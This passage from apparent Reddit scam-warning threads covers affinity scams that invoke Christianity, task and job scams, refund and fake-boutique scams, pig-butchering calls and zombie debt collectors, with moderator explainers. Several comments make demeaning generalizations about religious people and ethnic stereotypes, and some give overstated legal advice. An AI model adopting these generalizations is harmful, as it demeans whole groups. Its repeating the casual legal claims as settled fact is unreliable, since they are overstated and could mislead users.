There's really no significant difference between this and recruiting young men who believe there are 72 virgins waiting for them in a hereafter they cannot imagine while they are still on earth. Get people to give you their money? Get people to give you their life? 

It's a very old story. 

Anyway, also, I've noticed for a long time that my aging Jesus/Gun relatives out in the midwest up through Dakotas will friend anyone on FB who even says as much as "Amen in Jesus Name" for anything. 

Anyone who is on a board on FB for a serious health concern, beware, they are also there trying to sell you cures or just plain dumb cures that at best don't work, at worst they will harm you.
- Just want to add: while many people are saying its because the religious are more gullible (and I agree that's part of it), that's not *really* the main reason. 

The main reason is to make it seem like they are part of your in-group. Everyone is susceptible to giving the benefit of doubt to people in their in-group. If they can successfully make you think they are similar to you in someway, you are more likely to trust them.

Most people in the US have some religious background, even if not actively practicing, and lean towards Christianity. So they are more likely to trust others who claim to be of similar backgrounds, even just a little bit.
- In real life people do this as well. And \*generally\* when someone says they are a good christian it is code for the opposite.

I once had a realtor tell me "any time I see a fish on a business card I know I am about to get screwed."

Basically if you have to call out some religious affiliation to to convince someone you are a good person then you have already lost the battle.

- Most of these scams come from overseas, so the people running them will attempt to ingratiate themselves to their victims using what they believe are positive-sounding cultural tropes. For example, they know that a large segment (probably a majority) of the American public practices some form of Christianity. However, they *mistakenly* believe that those same people are so *entrenched* in their beliefs that making that "I'm not allowed to lie" claim makes them sound credible. 

They also seem to forget that a significant number of Americans are Jewish, Muslim, Hindu, Buddhist, agnostic, atheist and whatever else I forgot.  

Incredibly, there are likely a small segment of their victims who will swallow this comment as truth. Very, very small, but they only need to have a few successes.

There are other examples of this, mostly in the wording and grammar of the messages they send out. We all chuckle about the overuse of the word "kindly," and in some of the stilted phrases used. They apparently believe that these things make them more credible to the reader.

The sad thing is that there *are* always some out there who believe this shite and  send them money anyway.
- Look up "affinity fraud." Should find your answers there.
- We like people who we think are like us. So, it's an affinity group.

If I'm a Christian and you are a Christian, it's assumed we have things in common. Since much of that is supposed to be good things, that's a way for them to connect and assume a level of trust.

It's crap, but it works.
- When a business or individual advertises their faith as part of their image, I tend to avoid them. ¬†Christianity is about the walk not the talk.¬†

Preach The Gospel At All Times And If Necessary Use Words.
- Because other Christians are typically easier marks.

Same reason you're more likely to get scammed by a business with overtly Christian imagery in their marketing.
- Because many Christians believe that Jesus is a supernatural being that personally guides their daily life. So if they see an opportunity and their brain is telling them to be hesitant because it makes no sense, but the scammer says they too are Christian, this means that although the idea makes no sense, they should submit  to God's plan.
- If you believe in a sky daddy, you‚Äôll believe anything.
- The scammers are working from their biases and misbeliefs regarding what they think their targets believe. It would not work with most Christians (in my opinion, I'm not a Christian), but works with their victims because they are naive, ignorant, lonely, stupid, in mental decline or whatever other reason that also makes people think celebrities are chatting with them.

If you've had someone flatter you or try to engage you in a discussion, talking up what they think you should like based on a stereotype, it's similar to that.
- You pretty much answered your question in your post - there are more xtians in the english-dominant first-world countries with the elderly targets they prefer, who are often trusting and more charitable as the tenets of christianity often preach they should be. 

Here in the US where evangelicalism reigns so strongly - and given that many west african countries that if not xtian now, are at least brought up xtian - gives them an extra angle to exploit upon their victims. Charlatans hiding behind christianity has been par for the course for ages; what better way to ply money from the devout than invoking God's name to keep them on the hook?

If they spoke Spanish well, they'd be just as successful, if not more so - appealing to xtian charity and trust is the point. 

To quote WhiteRose from Mr. Robot: 

"Empathy... or, gullibility. Take your pick."
- To some people (and I mean no disrespect to Christians in general), saying "I'm a Christian" is like some membership card in a society of honesty and integrity.  Also, finding someone who is a legit and proud Christian (or any religion, for that matter) means you have found someone who operates on a level of faith, and is willing to accept information they cannot factually confirm.  That is the exact thing a scammer needs, someone who is willing to somewhat blindly believe what they say even though they cannot prove it.
- Google "affinity scam" for more info.
- Likely situation: The scammer is a Muslim in Africa. They are targeting people in North America, specifically United States and Canada. If they were scamming locally, the pitch would be, "You can trust me as a fellow Muslim," but of course there could be real consequences for acting locally. The assumption is that nearly everyone in the US identifies as a Christian, so scamming globally, that's your assumed identity. They will be whomever they think you want them to be.
- They correctly assume that American Christians are easy to fool and it literally just takes saying you are Christian to earn their absolute trust.
- Religion is very important in parts of Africa; they use it because to them it means they're honest and genuine locally. Which is ironic, because they're thieves.

Like the kindly, people who use god/christianity are typically from Nigeria or countries around Nigeria.
- Because many christians are pretty gullible. Or at least that is what the scammer (or whomever wrote their script) believes. 

It could also be a result of the scammer and script writer being tools of the NK or Iranian states or even the CCP I imagine.
- They have encountered missionaries.
- between this and having the name Josh with the most midwest white american accent ever, that will fool a victim
- Because, it‚Äôs easy pickings to scam people that have already been scammed and don‚Äôt even realize it. Once you know someone believes in an invisible wizard that lives in space you know you can convince them of anything.
- They are hunting for Christians because they make good marks. Even better if the victim is Mormon, JW, Evangelical, etc.¬†


If someone already believes ridiculous shit and gives their hard-earned money to shysters then there's a good chance they'll do it again.
- Not only internet scammers do this. 

I remember I one time had some dude coming up to my ship in Morrocco (Jorf Lasfar or Casablanca, I'm not sure right now) and asked me if we could do some business together. When i rejected he claimed over and over again that he's a christian (like me!) and that I could trust him. And I left the church already years ago at that point in my lifeüòÖ 

But yeah, they try to bond over that with you and try to look more trustworthy because they know how gullible religious people can be.
- Wolf wearing sheepskin, i.e. camouflage so they appear to be something they usually are not.
- They‚Äôre softening up their prey for the kill.
- They feel that you will more readily fall for their BS since they a theoretically more pious from Christianity!
- The intention is to make them seem reliable and conscientious and honest because they are Christian. Personally, any contractor wearing a cross on their sleeve is immediately nixed from consideration becasue I figure they are sketchy af since they resort to such a manipulative tactic.
- For a scam to be successful, the scammer has to be able to get the target to let down their guard.  You can do this in multiple ways, but generally they're either trying to scare you or they're trying to build rapport with you.  Getting two people of the same religious faith talking with each other is an immediate source of common ground, and given that the US has a significant population of declared Christians it makes sense that this is a vector that is used.  Most of the scams I get targeted by as a man who is online in multiple places involve trying to generate a conversation and rapport by using pictures of young attractive women into fashion or gaming who aggressively want to get to know all about me before they start pitching me on crypto or too-good-to-be-true investments.

Think about all of the TV pastors who are out there telling watchers that they need to give them their next paycheck because God declared that he wanted the pastor to have his fourth private jet and the people who then send in their money because they think that it's a worthy cause, and you start to understand the people who are really being targeted by these scammers.  The US is a common target because by global standards people who are limited in their wealth are still fabulously wealthy by the standards of the impoverished in Africa or India.  A quick Google search (and looking at the results instead of the AI generated response) says that a good salary in India nets almost 400,000 Indian Rupees in a year.  Punch that into the exchange rate system and that reportedly equates to about $4500 USD.  Scam some old retiree out of $10,000 and you've made two years' worth of honest salary in a day or a week.
- Because Christians will automatically trust them.
- One of the oldest scams there is, Always seems to work.
- I think it's an attempt at lowering the victims guard by playing on their sense of in-group membership. "We're all good honest christians here, right? I wouldn't scam you!"
- Scams used to be called a "confidence trick" which meant gaining the mark's confidence before scamming them.  So, claiming that they are Christian is just one more tool to buddy up to the mark.

A huge number of old, white, rich Americans are Christian, exactly who these scammers want to target.  So, saying they are Christian too will work out the majority of the time.
- To gain trust from a population that easily deceived.
- Most people in the US, the UK and also some African countries identify as Christian. Especially older people who are more likely to fall for this stuff. They probably figure there's a good chance their potential victim is Christian, and will exploit that to gain their trust.
- i think it probably is connected to the idea of tithing, my in-laws struggle with money but will throw cash at anything christian because they think it makes them better christians
- Christians and other religious people tend to be super-gullible by nature. Stating you‚Äôre a Christian is a way to disarm any mistrust they may have because said person ‚Äúfollows the teachings of the baby Jebus‚Äù.
- When you stand for nothing, you'll fall for anything.
- you'd think everybody knows religion is the ultimate scam. It is like scammer saying "I am not a scammer" ;)
- If its from He Gets US üòÜ
- They are selecting out the smart people.  They want morons only.
- Because if you can believe that ritualistically eating the flesh of a zombie rabbi who lived 2,000 years ago means that you are absolved of all blame from when a woman made out of the rib of a man ate a pomegranate, then you'll believe anything.
- Im thinking in some cormers of the world people think crishtian = westener. 


Sometimes you see people having "crishtian names" like John or Bob or something while their given name is Chevaramdriimmong Phatdmngondong. 



Im guessing they dont actually think that much about Jesus in that scenario, its just easier for westeners.




Edit also it could be that on top of this in their corner of the world crishtianity might be seen differently, as some sort of smaller group or emerging group for lack of better word. When Im guessing all over western world its probably not seen as a group atall many times.
- I needed a handyman once and a friend recommended a guy from her church. He was nuts, called himself "Jesus Jerry" and did a shit job. She had told me he did amazing work. When she asked me about his work and I told her he did a shit job, she admitted she had no experience with his work and figured he was a good handyman because he went to her church.
- I was in Utah for a while and if you're Mormon, all the other Mormons treat you like you are worth something.  Say you aren't Mormon and they are friendly, but are not going to do business with you.
- And if you self identify with Christianity you are loudly announcing that you are easy to trick and a good target for scams.
- Truth! I was approached at Church by a new member.  He introduced himself and said he was looking for a good Christian woman.  I asked the pastor about him.  He was recently paroled out of jail and looking for place to live while he attended his rehab program.
- Also Christians are really gullible
- The religious have already fallen for one scam... so they're more likely to fall for others.
- > It's mostly as simple as you'd expect, it's a very basic attempt to come off as more trustworthy. 

My in-laws bought a house from a seller that happened to be some form of god-man at a local church.  I specifically remember their comment about being able to trust him.   Then they moved in and found the issues with the house that were hidden.

To be fair, these weren't severe issues but they were annoying and costly to deal with later when discovered.
- > "affinity marketing".

I only noticed it recently, but [Mike Lindell](https://images.axios.com/WFrjY6GG7jCO0QpFVQDqWbRsXYk=/0x0:4652x2617/1920x1080/2024/02/22/1708614964730.jpg?w=1920) who promotes MyPillow, always wears a Christian cross somewhere.
- Yes there is the "your sister from Yemen" scam on Youtube which targets Arab Muslims.
- They answer the phone in the first place.
- > **Scammers don't do a lot of science**... Basically they try lots and lots of techniques.
> 
> If they work, they repeat them. If they don't work, then they try something else.

That's pretty much the definition of science.
- Kindly do the needful and revert back.
- My ex's dad put the fish on his logo. He was a very shitty person. But he said you can charge more with the fish. 
My parents did tend to be more susceptible this way. They were very kind people. I would rather make my decision by a person's actions. I don't think there are any cheat codes.
- Have you met many Muslims, Jews, or Hindus? I think the more traditional, insular, and ultra-religious of any faith are more gullible. And all faiths will fall for affinity scams:  I am blessing you with this investment plan, because you're MOT / fellow faithful / member of congregation.
- No. You're right. American evangelicals xtians are, as a group, really gullible. They're predisposed to all kinds of scams: medical quackery, get rich quick schemes, multilevel marketing, on and on. Rubes ripe for the picking.
- One the requirements of most religions is blind faith despite significant evidence that all religions are human-derived fables and philosophies.

If you can find a target audience where suspension of disbelief is an essential component then you‚Äôve got fertile ground to run your con‚Äîespecially if you can convince the target that you share a common religious identity, which doesn‚Äôt take much for a true believer.

- I‚Äôve definitely seen it in US scammers too, especially in multilevel marketing and in megachurches run by con artists. ¬†Apparently, if I spend/give loads of money, Jesus will pay me back with interest‚Ä¶

I think these scammers use Christianity because there are a lot of Christians. ¬†This gives them a bigger list of targets. ¬†If they could make money claiming the Flying Spaghetti Monster would make victims rich, they would.
- I know this is true but interestingly as a Brit I see this less  compared to the US there is a lot less overt Christianity here and scammers seem to have picked up on the fact talking about being a Christian sets off alarm bells because normal people generally don't. It happens but usually only Internet scammers and even there less.
- I would 100% not be surprised at all if it were a thing for a handyman to regularly attend like 3-4 different churches like this to drum up business. 

I've always thought of this since my long ago husband and I were grad student friends with another couple who had also decided to stay in the geographic area. They were "auditioning" churches to see where they fit and I think it was like the clap of thunder over my head that it wasn't so much as what you actually \*believed\* as opposed to meshing with a local social group of ... just other people. 

Like if you could go into HS and audition senior cliques where in the beginning no one tried to exclude you, but to love-bomb you as freshmen. 

That's some real anthropological shit right there
- That's what it's like where I live. Sucks if you don't belong to a church and need someone to do work on your house.
- She called him Jesus Jerry because the only time she's heard his name is what someone else says "Jesus! Jerry, you did a terrible job"
- A lot of older people simply grew up as Christians.  I don't think that makes them easier to trick.  It's the older part that scammers are after.
- Whenever someone declares themselves to me to be devoutly religious, I wonder if the person is one of the charismatic, one who is complicit in simply constantly recruiting to the group, or truly stupid

The three or 4 Jehovah's witnesses middle aged ladies who showed up on my front door step a few weeks ago while an SUV idled in the driveway looked very fucken lost as people. 

We just had a snowfall for the first time since my last adult kid moved out. I shoveled a path up the steps but if one of those religious people falls on my property do they sue homeowners now? 

I haven't thought about these things for too many years.
- Televangelists and faith healers scam Christians legally every single day, so maybe the other scammers are just looking to them as their role models.
- >He was recently paroled out of jail and looking for place to live while he attended his rehab program. ... he was looking for a good Christian woman.

That's code for: "I'm looking for a woman that won't leave when I beat the shit out of her."
- Gotta love our fucking  society's priorities, don't give the dude rehab when he's in jail being watched most of the day

Give him out patient rehab where he can easily get his hands on the addictive substance of his choice VERY easily

"Sober for rehab, drunk for dinner"
- The poster child of affinity marketing.
- Genetic Algorithms 101.   With "how much money did we scam?" being the fitness function.
- Took this far down to find the answer \^\^\^ It's a selection filter.

If someone swallows that argument, they've outed themselves as the ~~gullible~~ type who will respond to your appeal to emotions, authority, and/or kinship ("I'm just like you") -styles of persuasion.

Conversely, if they reject it, they've identified themselves as not being an easy target, and more than likely you'll be wasting your time trying to dupe them. So best to remove them from the pool of possible marks right away, letting you focus your energies on the ones your scams will actually persuade.

This kind of statement neatly does that.
- I think going to multiple churches when moving to a new area makes sense. Some churches are warm and welcoming, others not so much. 

Also their particular interpretation of scripture could vary wildly. It's not a place you are  only going for an hour Sunday. If you are involved, you'll participate in Sunday school, choir, mid week services, charity events. You will make friends and possibly even socialize with these people.

Your kids will also be going and forming friendships, as well as picking up whatever message the church packages.  It's not like going to Micky Ds or Wally World - it's a life decision. 

The wide variety of churches, makes it a very important decision. Especially if you plan to be involved in church life. 

There are churches that preach what Jesus said and others that pick and choose and others that seemingly make stuff up. 

***I was raised in the church, I haven't attended since becoming an adult. I'm not defending church, just trying to point out why it's an important decision and visiting multiple churches is a smart way to make that sort of commitment.
- I dunno, there might be some truth to it. After all, televangelists and faith healers scam them every single day. They even found a way to scam legally.
- Around here we have Jehovah's Witness to contend with. In 1985 I was run over by a carload of them at my little 2 bay gas station. Sued and won and requested and got a restraining order to stop them from bothering me. That order has long since been voided due to time. They need their god to protect them when they knock on my door. I so enjoy the complete surprise and terror when I greet them, it usually goes like this. " You need to turn the fuck around, get in that car and get the fuck off my property you fucking assholes." The stunned look is priceless. Some try to power through. That is when I whip the door open and scream things like, "are you deaf as well as stupid" and then rant and rave like a madman, language is key. It takes years for them to unknowingly approach the house again. When they do my day brightens and all seems well. Been awhile I miss them and our chats.
- >if one of those religious people falls on my property do they sue homeowners now?

It depends how badly injured they are

If they're old enough, falling on ice/snow can lead to broken bones and will definitely sue, but as I'm not a lawyer or doctor so it's all guesswork

I'd think you'd have to argue that they were soliciting and had really no reason to be on your property to begin with, hanging a "no solicitors" sign I'd imagine would be a good start
- I think I just said that, though.

You are auditioning a book club and new friends. You are not actually meeting God or getting a grade on your choice. You just do what you want.
- I wish there was a church I could go to that just wasn‚Äôt about indoctrinating people with complete nonsense. Maybe I just need to find one that teaches nonsense I can put up with
- There are plenty of witch doctors and faith healers who scam people of other religions, it isn't limited to just christianity.
- I would've done more than sue, I would've pestered the district attorney to file attempted murder charges against them
- Well doing what you want is pretty much a definition of life. I would say that these people are searching for a spiritual home and trying to make the best decision under the circumstances. I'm going to go with their putting a lot more thought into it than joining a book club. I would also go with that they believe they have already met God and are familiar with him.
- I'm no longer a believer. My last girlfriend was, I watched online services with her and it was the closest thing I've ever seen to straight forward Christian messaging. There was zero politics and zero prosperity gospel. 

If I was going to be an Xtian, this is a place I'd go. I was brought up in very doctrinal churches, lots of esoteric sermons. This particular pastor went to the message of salvation and that was it.
- Of course not. Religion in general operates on faith, and faith is easy to take advantage of by bad actors.
- I like your style.
- I treat religion like the oligarchy treats politicians

Believe in many and you'll never go wrong

I take the best bits from all world religions/mythologies and is basically all boils down to

Just be a good person and treat everyone you meet with love and respect.
- Pretty much - I've been a big fan of Zoroastrianism since learning about it in college - it has always been interesting watching Abrahamist get uncomfortable when explaining how much their faith borrowed from the Persians

- It makes perfect sense actually. They want your money, and are lying to you to get it. The tasks are meaningless. The numbers are meaningless. All they care about is you sending them money. Nobody gets paid to mindlessly click on stuff.
- This is a typical !task scam - so common there‚Äôs an auto-response for it - read below.
- Job scam. Same script used by many other task scams.

Nobody really pays you for clicking a screen, no matter what they call it.

**This is not a job, its a scam to take your money.** The platform is fake, the tasks are fake, the people are all lying to you. The name of the "company" doesn't really matter, because there are hundreds of these phony jobs using different company names. But the scams all follow the same pattern:  You will be required to pay a fee to continue working or to withdraw your money. Then another fee, and another. Then they disappear with your money.

Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, Telegram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (check is fake, you lose money)

- job involves re-shipping packages (parcel mule)

If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.
- !task
- This is yet-another example of the task scam.  Don't pay money to make money.  Don't expect anyone to pay you to do something that requires no skills.
- This is a !task scam we see it many times every single day.

There never was any money and the tasks you were clicking were nonsense. There‚Äôs no magic way to make thousands ‚Äú*just for clicking tasks*‚Äù
- This type of scam is sadly too common these days. 



They promise easy money for simple tasks, but their real goal is to trick you into "investing" more and more. Remember, no legitimate job will ever ask you to pay money to get paid.

If you come across something like this, stop immediately. 

Don‚Äôt send them anything, and take a moment to research the company thoroughly before accepting any online job offers.
- Hi /u/creepyposta, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/erishun, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: PayPal scam? Payment from "eBay"
Body: I received a payment for the amount of $12.51($11.95 after fee) out of the blue from "eBay". Obviously, it's not really from eBay as the email address it from the domain 163.com. I have not received any other communication about this. No one asked me to send anything or to take any action. 

In my mind, the worst case scenario is that they request a refund. I'll be preemptively refunding the payment in just a minute but I'm trying to figure out what the scam is. I tried searching on here for "PayPal" and "ebay" but didn't find the same scenario. 

What is the scam here?

- Do not refund it!  If they ask, tell them to get in contact with PayPal & DON'T TOUCH IT!
- It's a kind of fake invoice, people who are unaware it's a scam and because they are honest (hopefully, they still exist), will click on the "reimburse button" linked to a fake website with probably a fake form with fields for bank/credit card information and other contact details.
- !refund scam
- Hi /u/DasLazyPanda, AutoModerator has been summoned to explain the Refund scam.

Refund scams usually start with a spam email about a fake transaction, although they can also be sent through SMS or any other messaging service. The message will provide you with a phone number to call if you want to cancel the transaction, and if you call the scammers will try to get you to provide credit card or banking information in order to receive your refund. Scammers have been taking advantage of Paypal's invoice system to send out realistic scam emails through Paypal itself, here is a news article about that technique: https://krebsonsecurity.com/2022/08/paypal-phishing-scam-uses-invoices-sent-via-paypal/. Here is a Snopes article regarding the Norton variant of this scam: https://www.snopes.com/fact-check/norton-email-renewal-scam/

Title: Instagram book review scam?
Body: Hello!

I run a small book club and we are going to start doing book reviews from authors. I posted an ad on our IG and have gotten some submissions via Jotform, but some seem a little fishy and I wonder if there are scams associated with this? The person would need to go to our IG main page, click on our bio, then click the link to the jotform, then fill out all the fields - seems like a lot for a scammer to do, but I've gotten a bunch from "I'm the publicist of this author" people. Is using publicists normal for authors to find places to get books reviewed? We are \*NOT\* charging and only asking for a copy of the book in return. So I'm just a little hesitant as we've gotten 3 submissions for 3 different authors from 1 person acting as a publicist for all 3 of them.

- Yes that's a book publicist job - to promote new authors. Not a scam but the person probably knows you are a book club and are trying to get their books talked about. Most likely they will ask you to review on goodreads or amazon also.
- So no harm in actually reviewing the books they submit? Or avoid these types of submissions and only do submissions from authors directly?
- I don't think it's any harm reviewing the books. But like I said they might ask you to review other places but for smaller authors, they depend on word of mouth.

Title: What is the possibility that a scammer refunded me my money?
Body: Hello guys,

Recently I was so sleep deprived that I order something thinking it was Costco. It looks legit and actually came on top of the Google search with the other stores such as target and Walmart. So I am assuming they were advertising it. I didn‚Äôt even realized to check the url( lesson learned). So i go and see that the merchant credited my account. I used my credit card. Once I found out I locked my card and reported it for fraud. It was also from another country. The website is not available anymore but I did report it. I don‚Äôt understand why they choose refund me the money. I am kind of suspicious.

- Is it possible their account got shut down so the payment never went through?
- I would assume that your credit card company clawed the money back and refunded you. But you're right, scammers don't voluntarily do refunds.
- I think you got lucky and either the transaction didn't go through or your cc company stopped the transaction.
- I don‚Äôt think saw because first the credit card company credited my account while they investigated, but it was credited again for the same amount. The credit card company told me the merchant credited my account so they are taking the one they credited back. So confused.
- Ya I am surprise how they did it though because it‚Äôs not easy to return money from a scammer.
- Its not easy if you are one if the first ones to send money to that particular account. Basically the one way that money does get returned is exactly what happened here: the account is already under investigation for scamming other people so your payment never makes it to the scammer, it gets tied up in a fraud hold on the scammers account and returned to you.

Title: Empty email with "[Firstname Lastname].txt" attached
Body: I just got an email that I'm guessing is a scam. The subject line is the first and last name associated with my email address (not my real name). The body of the email is empty, but there is an attachment with the same name as a .txt file. The sender is a generic sounding woman's name and the email address matches that name followed by a 3 digit number.

I immediately suspected it as a scam, since I don't use that email address for anything important or personal. I'm not dumb enough to download or open the file to see what's in it. I just thought it was interesting and pretty convincing as far as these things go. I've seen attachment scams before, but never with a personalized filename. Has anyone seen this?

- Feel free to download it; files aren't infectious just by existing, they have to actually be executed to do something. Then open it *from a text editor* - open NotePad, then use File->Open - to avoid any chance it's an executable with a tricky name that'll run when you double click it.

That said, yes, it's definitely a scam. Maybe one that was fired off by mistake, maybe a real one, but a scam if some sort regardless.
- Fyi: Don't open pdfs however. They can contain malicious macros.
- I looked into it, and it was the exact same threatening text I've seen in .pdf scams. Talking about search history, gave a bitcoin address, then said there's a specific pixel in the email that will start the clock until my information is leaked.

Kinda anticlimactic, tbh. I know you shouldn't expect much effort from scammers, but at least they could have updated the script.

Title: Pig butchering with a phone call?
Body: So I got a random text from a number I didn‚Äôt know in a city I don‚Äôt know anyone in. Pretty common. Someone looking for John. I‚Äôm not John. Then got a second one.  And a third while I was in a meeting. Generally don‚Äôt touch my phone during work so all of this was through my watch. 

But then I got a phone call from the same number. Didn‚Äôt answer. Two minutes later another call same number. Finally decided to pick it up but said nothing. It was a legit sounding woman with a heavy Asian accent. Broken English. She asked for John. I hung up. But immediately got a text from the number again. The persistence annoyed me but I was more intrigued by the phone call.

Anyway this person did the standard pig butchering thing with a hot Asian chick and broken English and asking questions. Nothing new. I stopped responding just around the time I got the request to go to telegram and she sent a second picture (same girl at least). 

The phone call part is weird. It sounded like an Asian girl (sorry can‚Äôt pin down accent) in a car. I‚Äôve seen a few of these in the last few years and had some friends with similar stories. But never a phone call. Is this the evolution? 

And I know I shouldn‚Äôt  engage but alas I did. Same girl (different pictures) as girl in linked thread [https://www.reddit.com/r/CryptoScams/s/JhilXX9PYE](https://www.reddit.com/r/CryptoScams/s/JhilXX9PYE)

- Typically they‚Äôll do a video call after they‚Äôve spoken with you a bit and gotten the victim to switch to WhatsApp or Telegram. 

However, it‚Äôs known that they have employed ‚Äúfishers‚Äù here in the US to manage dating profiles etc to funnel people to the ‚Äúcall center‚Äù to scam them further.

Since these people operate on commission, it could be one of them switched things up a bit.
- It may be. I think I read a post here last week from someone else who mentioned getting a call that spiraled into a pig-butchering scam.
- Very likely just this particular scammer‚Äôs way of operating but yeah why not throw in the call so you might think it‚Äôs more legit. Be on guard for new and different scams coming your way since you engaged and verified you‚Äôre live and ripe for more attempts.
- Scammers know that the word is getting out about text based communications, and how there is never any actual audio or video calls with the hot woman.  

So they are now creating hot woman audio and video scenarios to try and get past this burgeoning security awareness 'coblock' to their scam game.

Title: Epoque/Suava/Logan scam - beware!
Body: I saw an Instagram ad for ‚ÄúEpoque‚Äù a boutique allegedly located in my city owned by two old women who were closing shop and selling all their merch. 

I ordered a sweater from their website - then later saw another identical ad this time under the name of ‚ÄúLogan‚Äù also owned by the same two older women in my city and this time they were closing up shop and blaming the ‚ÄúBig retail stores‚Äù for their untimely end.

I wrote them immediately demanding a refund. They responded two weeks later saying the item had already shipped and needed to reach me and then get sent back in order to get a refund.

When I emailed them again, their website had magically changed to ‚ÄúSuava‚Äù

suava-boutique(dot)com

So the boutique that was supposed to be located in my city, sent me cheap replicas from China (surprise, surprise) and now I have to return items to China on my own dime to get my money back.

I get it. I shouldn‚Äôt have fallen for the scam, but I did, and wanted to warn everyone.

Increasingly, the brands that advertise on IG are unreliable and often scams, so maybe just don‚Äôt buy anything from there.

## The safe way to post about scam websites is:

* Write the website address in the title of your post
* Don't post clickable links in the body text

## So:

* If your post already has a website address in the title: edit the body of your post to remove the clickable link. For example, you can replace a .com with (dot)com - then wait until a moderator comes to take a look and approve this.
* If you didn't put the website address in the title: since titles aren't editable, we encourage you to delete this post, and post again - this time, writing the website in the title of your new post.
* If this post is NOT about a possible scam website: for example, if you tried to share a news article, or a government website, etc - just wait until a moderator comes to take a look and approve this.

- Hi /u/Wide-Spray-2186, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- Zombie !debt collectors. Debt from 2013 is uncollectible in every state in the country. Ignore them. They can‚Äôt do anything.
- Scam. It‚Äôs not your job to help a process scammer find you (I‚Äôm assuming you are in the US). And a process server has nothing to do with issuing a summons.
- Scam: https://www.reddit.com/r/Scams/s/eJdJccqHHF

Ignore them. Do not respond, do not call back. Just block all numbers that they use until they give up.
- You‚Äôre being scammed. Block them. Nobody will ever call you for a summon
- If legit, they'll find you. 

Just ignore and block the calls.
- Not a scam, but some law firm/debt collector that bought bad paper, aka "zombie debt." Process servers don't call, they simply serve, they definitely don't tell defendants that the attorney has the wrong address, and I'd be surprised if the person you spoke to was an attorney, at best a paralegal but most likely a "legal assistant."  Block the number and don't call them again.  If you do, in fact, have a bad debt dating back to 2013, it is almost certainly beyond the statute of limitations and is uncollectible UNLESS you ratify the debt.  Just ignore them.
- This is a common scam. Process servers come to you in person, not over the phone.
- Process servers don't want to tip you off that they're coming (they don't want you to stay inside/avoid answering the door etc) so they wouldn't call you and let you know!
- Process server‚Äôs job is to hand you papers.   Not settle a debt.
- Scam! My partner and I both got this. Partner finally asked them to mail them some paperwork and caller just hung up on them. I also did a reverse phone # online and came up with other people being scammed.
- Ignore it. 

If the police come, they come
- Hi /u/CIAMom420, AutoModerator has been summoned to explain the Debt collection scam.

